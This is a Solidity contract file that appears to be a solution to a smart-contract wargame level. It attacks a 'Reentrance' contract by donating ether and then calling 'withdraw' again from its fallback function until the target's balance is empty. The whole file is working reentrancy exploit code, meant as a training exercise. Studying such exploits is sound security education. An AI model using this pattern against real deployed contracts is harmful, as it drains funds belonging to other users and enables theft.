pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReEntryAttack {
    
    Reentrance target;
    uint public amount = 1 ether;
    address private owner;
    
    constructor(address payable _targetAddr) public payable {
        target = Reentrance(_targetAddr);
        owner = msg.sender;
    }
    
    function makeDonation() public {
        target.donate.value(amount).gas(4000000)(address(this));
    }
    
    fallback() external payable {
        if(address(target).balance != 0) {
            target.withdraw(amount);
        }
    }
  }
